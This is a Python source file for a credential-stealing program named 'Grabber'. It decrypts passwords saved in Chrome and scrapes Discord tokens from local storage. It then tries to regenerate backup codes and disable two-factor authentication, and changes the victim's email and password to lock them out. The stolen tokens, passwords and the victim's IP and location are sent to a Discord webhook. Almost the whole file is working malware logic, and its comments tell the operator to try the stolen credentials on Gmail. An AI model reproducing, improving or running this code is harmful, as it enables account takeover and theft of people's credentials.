import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime

class Grabber:
    def __init__(self):
        self.webhook = "https://discordapp.com/api/webhooks/"
        self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
        self.api = "https://discordapp.com/api/v7/"
        self.errors = {
            1: 'Unauthorized',
            2: 'Invalid two-factor code' 
        }
        self.dirs = [
            self.getAppData() + '\\Discord\\Local Storage\\leveldb'
        ]
        self.passwords = []
        self.validPassword = [] # <TODO> give it a better use
        self.tokens = []
        self.validTokens = []
        self.backupCodes = []
        self.session = requests.Session()

    def getHeaders(self, token): 
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': token,
        }
        return headers

    def lockOut(self):
        time = datetime.datetime.now().strftime("%H:%M %p")
        newPassword = self.newPassword()
        newEmail = self.newEmail()
        grabIP = self.grabIP()
        encodedBytes = base64.b64encode((str(newEmail)).encode("utf-8"))
        base = str(encodedBytes, "utf-8")
        for token in self.validTokens:
            for password in self.passwords:
                userInfo = self.session.get(self.api + 'users/@me', headers=self.getHeaders(token))
                userInfo = userInfo.json()
                payload = {
                    'avatar': userInfo['avatar'],
                    'discriminator': userInfo['discriminator'],
                    'email': newEmail,
                    'password': password,
                    'new_password': newPassword
                }
                r = self.session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
                r_json = r.json()
                token = token.replace('[', '').replace(']', '').replace("'", '') # :shrug:
                message = f'= {time} ='
                message += '\nToken :: ' + token
                message += '\nIP :: ' + grabIP
                message += '\nOld Email :: ' + userInfo['email']
                message += '\nOld Password :: ' + password
                message += '\n[ - - - - - - - - - - - - - - - - - - - - - ]'
                try:
                    if userInfo['email'] != r_json['email']:
                        message += '\nNew Email :: ' + newEmail
                    else:
                        message += f'\nNew Email :: [None, couldnt change]'
                except (KeyError):
                    message += f'\nNew Email :: [None, couldnt change]'
                if password != newPassword: # <TODO> Find a better way to do this check
                    message += f'\nNew Password :: ' + newPassword
                else:
                    if self.errors[2] in r.text:
                        message += f'\nNew Password :: [None, couldnt change]'    
                message += f'\nLogin Url :: https://ically.net/#/{base}\n\n'    
                message += '= Quick tip: You can try if the [Old Email] and [Old Password] work in gmail! ='
                if self.errors[1] in r.text:
                    self.webHook("[ERROR] :: Couldnt retrieve any valid token from the leveldb file")
                    print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
                    input("Press any key to exit...");exit(0)
                if self.errors[2] in r.text:
                    self.webHook(message)
                    print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
                    input("Press any key to exit...");exit(0)
                else:
                    try:
                        if r_json['id'] == userInfo['id']:
                            self.webHook(message)
                            print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
                            input("Press any key to exit...");exit(0)
                    except:
                        pass

    def bye2FA(self):
        for password in self.passwords:
            for token in self.validTokens:
                payload = {
                    "password": password,
                    "regenerate": True
                }
                r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
                with open(f'{self.getAppData}\\Discord Data\\Backup.txt') as f:
                    f.write(r.json())
                self.webHookFile(message="Some backup codes", file=f'{self.getAppData}\\Discord Data\\Logger.txt')    
                for i in range(10):
                    try:
                        backup = r.json()['backup_codes'][i]['code']
                        self.backupCodes.append(backup)
                    except (KeyError):
                        self.webHook("[DEBUG] :: User doesn't use 2 factor authentication")    
                for code in self.backupCodes:
                    newPayload = {  
                        'code': code
                    }
                    req = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/totp/disable', headers=self.getHeaders(token), json=newPayload)
                    if req.status_code == 200:
                        self.webHook("[INFO] :: Successfully disabled 2FA")
                        return True
                    else:
                        self.webHook("[INFO] :: Couldnt disable 2FA (Maybe not enabled?)")
                        return False

    def grabPassword(self):
        # Credits to backslash: https://github.com/backslash for this chunk
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                email = result[1]
                login = result[0]
                if password != '':
                    self.passwords.append(password)
                if not os.path.exists(f'{os.getenv("APPDATA")}\\Google Backup/'): os.makedirs(f'{os.getenv("APPDATA")}\\Google Backup/')
                with open(f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt', 'a+') as f:
                    data = '=================================='
                    data += '\nEmail : ' + email
                    data += '\nPassword : ' + password
                    data += '\nLogin portal : ' + login
                    data += '\n=================================\n\n'
                    f.write(data)
            self.webHookFile(message="Google login data", file=f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt')  

    def grabToken(self):
        for location in self.dirs:
            for file in os.listdir(location):
                with open(f"{location}\\{file}", errors='ignore') as _data:
                    try:
                        regex = re.findall(self.tokenRegex, _data.read())
                        if regex:
                            for token in regex:
                                self.tokens.append(token)
                    except (PermissionError):
                        continue

    def checkTokens(self):
        for token in self.tokens:
            r = requests.post(self.api + 'invites/pornhub', headers=self.getHeaders(token))
            if '302094807046684672' in r.text:
                if r.status_code == 200:
                    self.validTokens.append(token)
                    self.webHook(f"[DEBUG] :: Valid token: {token}")
            else:
                self.webHook(f"[DEBUG] :: Invalid token: {token}")   

    def webHookFile(self, message: str, file): 
        payload = {
            'content': message
        }
        file = {
            "imageFile": open(file, "rb")
        }
        r = self.session.post(self.webhook, json=payload, files=file)
        if r.status_code == 200:
            return True

    def webHook(self, message: str):
        payload = {
            'content': f'**```asciidoc\n{message}\n```**'
        }
        r = self.session.post(self.webhook, json=payload)
        if r.status_code == 200:
            return True

    def getAppData(self):
        if platform.system() == 'Linux': 
            return os.getenv('HOME')
        else:
            return os.getenv('APPDATA') 

    def newEmail(self):
        email = self.session.get("https://ically.net/user.php?user=", data={"data": ""}).text
        return email

    def newPassword(self):
        passw = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return passw

    def randNumber(self):
        number = random.randint(1, 999)
        return number

    def grabIP(self):
        r = self.session.get('https://ifconfig.co/json')
        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
        return data

if __name__ == "__main__": # changing order will most likely fucc the whole code
    Grabber().grabPassword()
    Grabber().grabToken()
    Grabber().checkTokens()
    Grabber().bye2FA()
    Grabber().lockOut()
